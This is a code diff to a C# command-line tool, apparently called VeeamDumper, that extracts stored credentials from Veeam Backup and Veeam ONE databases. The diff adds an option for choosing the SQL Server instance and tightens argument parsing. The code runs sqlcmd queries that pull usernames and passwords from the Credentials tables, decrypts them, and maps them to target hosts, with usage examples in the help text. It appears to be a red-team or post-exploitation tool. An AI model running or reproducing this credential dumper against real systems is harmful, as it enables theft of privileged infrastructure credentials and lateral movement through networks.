@@ -58,6 +58,7 @@ namespace Veeam_Cred_Extractor
             string sqlcmdPath = "sqlcmd.exe";
             string psqlPath = null;
             string targetUser = null;
+            string sqlServerName = null;
             bool listUsers = false;
             bool veeamOne = false;
 
@@ -67,19 +68,22 @@ namespace Veeam_Cred_Extractor
                 switch (args[i])
                 {
                     case "-v":
-                        if (i < args.Length) veeamDbName = args[++i]; veeamOneDb = args[i];
+                        if (i + 1 < args.Length) { veeamDbName = args[++i]; veeamOneDb = veeamDbName; }
                         break;
                     case "-m":
-                        if (i < args.Length) sqlcmdPath = args[++i];
+                        if (i + 1 < args.Length) sqlcmdPath = args[++i];
                         break;
                     case "-p":
-                        if (i < args.Length) psqlPath = args[++i];
+                        if (i + 1 < args.Length) psqlPath = args[++i];
+                        break;
+                    case "-s":
+                        if (i + 1 < args.Length) sqlServerName = args[++i];
                         break;
                     case "-l":
                         listUsers = true;
                         break;
                     case "-u":
-                        if (i  < args.Length) targetUser = args[++i];
+                        if (i + 1 < args.Length) targetUser = args[++i];
                         break;
                     case "-o":
                         veeamOne = true;
@@ -105,7 +109,8 @@ namespace Veeam_Cred_Extractor
                     // Decrypt creds
                     if (veeamOne)
                     {
-                        Console.WriteLine($"[INFO] MSSQL instance: {veeamOneSQL}");
+                        string resolvedServer = sqlServerName ?? $".\\{veeamOneSQL}";
+                        Console.WriteLine($"[INFO] MSSQL instance: {resolvedServer}");
                         Console.WriteLine($"[INFO] Database: {veeamOneDb}");
                         Console.WriteLine($"[INFO] Sqlcmd.exe path: {sqlcmdPath}");
 
@@ -117,7 +122,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S .\\{veeamOneSQL} -E -d {veeamOneDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -144,7 +149,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S .\\{veeamOneSQL} -E -d {veeamOneDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -157,22 +162,27 @@ namespace Veeam_Cred_Extractor
                     }
                     else
                     {
-                        //string sqlInstance = GetVeeamSqlInstance();
                         var sqlInstance = GetVeeamRegistryValues(
                             @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql",
                             "SQLInstanceName"
                         );
 
-                        if (sqlInstance.TryGetValue("SQLInstanceName", out var mssqlInstanceName))
+                        string resolvedServer;
+                        if (sqlServerName != null)
                         {
-                            Console.WriteLine($"[INFO] MSSQL instance: {mssqlInstanceName}");
-
+                            resolvedServer = sqlServerName;
+                        }
+                        else if (sqlInstance.TryGetValue("SQLInstanceName", out var mssqlInstanceName))
+                        {
+                            resolvedServer = $".\\{mssqlInstanceName}";
                         }
                         else
                         {
-                            Console.WriteLine("[ERROR]: Reading SqlActiveConfiguration Registry key.");
+                            Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
+                            return;
                         }
 
+                        Console.WriteLine($"[INFO] MSSQL instance: {resolvedServer}");
                         Console.WriteLine($"[INFO] Database: {veeamDbName}");
                         Console.WriteLine($"[INFO] Sqlcmd.exe path: {sqlcmdPath}");
 
@@ -183,7 +193,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S .\\{mssqlInstanceName} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -210,7 +220,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S .\\{mssqlInstanceName} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -399,8 +409,21 @@ namespace Veeam_Cred_Extractor
                             if (string.Equals(dbtype, "mssql", StringComparison.OrdinalIgnoreCase))
                             {
                                 var mssqlValues = GetVeeamRegistryValues(dbConfigKey + @"\mssql", "SQLInstanceName", "SqlDatabaseName");
-                                if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
-                                    Console.WriteLine($"  - MSSQL instance: {instance}");
+                                string mapServer;
+                                if (sqlServerName != null)
+                                {
+                                    mapServer = sqlServerName;
+                                }
+                                else if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
+                                {
+                                    mapServer = $".\\{instance}";
+                                }
+                                else
+                                {
+                                    Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
+                                    return;
+                                }
+                                Console.WriteLine($"  - MSSQL instance: {mapServer}");
                                 if (mssqlValues.TryGetValue("SqlDatabaseName", out var vdb))
                                     Console.WriteLine($"  - MSSQL database: {vdb}");
 
@@ -409,7 +432,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = sqlcmdPath,
-                                    Arguments = $"-S .\\{instance} -E -d {vdb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                    Arguments = $"-S {mapServer} -E -d {vdb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -456,21 +479,34 @@ namespace Veeam_Cred_Extractor
 
                         var dbConfigKey = @"SOFTWARE\\Veeam\Veeam ONE";
                         var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
-                        if (dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled))
-                        {
+                        dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled);
+                        if (!string.IsNullOrEmpty(veeamOneEnabled))
                             Console.WriteLine($"  - Database name found in Registry: {veeamOneEnabled}");
-                        }
+
                         dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseServer");
-                        if (dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer))
-                        {
+                        dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer);
+                        if (!string.IsNullOrEmpty(veeamOneServer))
                             Console.WriteLine($"  - Database server found in Registry: {veeamOneServer}");
+
+                        string resolvedServer = sqlServerName ?? veeamOneServer;
+                        string resolvedDb = veeamOneEnabled ?? veeamOneDb;
+
+                        if (string.IsNullOrEmpty(resolvedServer))
+                        {
+                            Console.WriteLine("[ERROR] Veeam One SQL Server not found in registry. Use -s to specify it manually.");
+                            return;
+                        }
+                        if (string.IsNullOrEmpty(resolvedDb))
+                        {
+                            Console.WriteLine("[ERROR] Veeam One database name not found in registry. Use -v to specify it manually.");
+                            return;
                         }
 
                         string query = "SELECT t1.username,STRING_AGG(t3.host_name, ', ') as hosts FROM [monitor].[Credentials] AS t1 INNER JOIN [monitor].[CredentialsLink] AS t2 ON t1.id = t2.cred_id INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id GROUP BY t1.username ORDER BY t1.username;";
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
-                            Arguments = $"-S {veeamOneServer} -E -d {veeamOneEnabled} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -530,8 +566,21 @@ namespace Veeam_Cred_Extractor
                             if (string.Equals(dbtype, "mssql", StringComparison.OrdinalIgnoreCase))
                             {
                                 var mssqlValues = GetVeeamRegistryValues(dbConfigKey + @"\mssql", "SQLInstanceName", "SqlDatabaseName");
-                                if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
-                                    Console.WriteLine($"  - MSSQL instance: {instance}");
+                                string autoServer;
+                                if (sqlServerName != null)
+                                {
+                                    autoServer = sqlServerName;
+                                }
+                                else if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
+                                {
+                                    autoServer = $".\\{instance}";
+                                }
+                                else
+                                {
+                                    Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
+                                    return;
+                                }
+                                Console.WriteLine($"  - MSSQL instance: {autoServer}");
                                 if (mssqlValues.TryGetValue("SqlDatabaseName", out var vdb))
                                     Console.WriteLine($"  - MSSQL database: {vdb}");
 
@@ -540,7 +589,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = sqlcmdPath,
-                                    Arguments = $"-S .\\{instance} -E -d {vdb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                    Arguments = $"-S {autoServer} -E -d {vdb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -591,14 +640,27 @@ namespace Veeam_Cred_Extractor
 
                         var dbConfigKey = @"SOFTWARE\\Veeam\Veeam ONE";
                         var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
-                        if (dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled))
-                        {
+                        dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled);
+                        if (!string.IsNullOrEmpty(veeamOneEnabled))
                             Console.WriteLine($"  - Database name found in Registry: {veeamOneEnabled}");
-                        }
+
                         dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseServer");
-                        if (dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer))
-                        {
+                        dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer);
+                        if (!string.IsNullOrEmpty(veeamOneServer))
                             Console.WriteLine($"  - Database server found in Registry: {veeamOneServer}");
+
+                        string resolvedServer = sqlServerName ?? veeamOneServer;
+                        string resolvedDb = veeamOneEnabled ?? veeamOneDb;
+
+                        if (string.IsNullOrEmpty(resolvedServer))
+                        {
+                            Console.WriteLine("[ERROR] Veeam One SQL Server not found in registry. Use -s to specify it manually.");
+                            return;
+                        }
+                        if (string.IsNullOrEmpty(resolvedDb))
+                        {
+                            Console.WriteLine("[ERROR] Veeam One database name not found in registry. Use -v to specify it manually.");
+                            return;
                         }
 
                         string query = "SELECT username,password,description FROM [monitor].[Credentials];";
@@ -606,7 +668,7 @@ namespace Veeam_Cred_Extractor
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
-                            Arguments = $"-S {veeamOneServer} -E -d {veeamOneEnabled} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -1013,6 +1075,7 @@ namespace Veeam_Cred_Extractor
             Console.WriteLine("  map          Map credentials to specific targets [Experimental]");
             Console.WriteLine();
             Console.WriteLine("Options:");
+            Console.WriteLine("  -s <server>      Override SQL Server instance (value passed to sqlcmd -S)");
             Console.WriteLine("  -v <dbName>      Override Veeam database name (default: VeeamBackup)");
             Console.WriteLine("  -m <sqlcmdPath>  Override path to sqlcmd.exe");
             Console.WriteLine("  -p <psqlPath>    Override path to psql.exe");
@@ -1025,9 +1088,13 @@ namespace Veeam_Cred_Extractor
             Console.WriteLine("Examples:");
             Console.WriteLine("  VeeamDumper.exe enum");
             Console.WriteLine("  VeeamDumper.exe auto");
+            Console.WriteLine("  VeeamDumper.exe auto -s \".\\VEEAMSQL2016\"");
             Console.WriteLine("  VeeamDumper.exe mssql");
+            Console.WriteLine("  VeeamDumper.exe mssql -s \".\\VEEAMSQL2016\"");
+            Console.WriteLine("  VeeamDumper.exe mssql -s \"SERVERNAME\\VEEAMSQL2016\" -v VeeamBackup");
             Console.WriteLine("  VeeamDumper.exe mssql -l");
             Console.WriteLine("  VeeamDumper.exe mssql -o");
+            Console.WriteLine("  VeeamDumper.exe mssql -o -s \".\\VEEAMSQL2016\"");
             Console.WriteLine("  VeeamDumper.exe mssql -u \"administrator@vsphere.local\"");
             Console.WriteLine("  VeeamDumper.exe mssql -v VeeamBackup2017 -m \"C:\\Tools\\sqlcmd.exe\" -d");
             Console.WriteLine("  VeeamDumper.exe psql");
@@ -1036,6 +1103,7 @@ namespace Veeam_Cred_Extractor
             Console.WriteLine("  VeeamDumper.exe psql -v VeeamBackup2016 -p \"C:\\PostgreSQL\\15\\bin\\psql.exe\" -d");
             Console.WriteLine("  VeeamDumper.exe map");
             Console.WriteLine("  VeeamDumper.exe map -o");
+            Console.WriteLine("  VeeamDumper.exe map -s \".\\VEEAMSQL2016\"");
         }
     }
 }
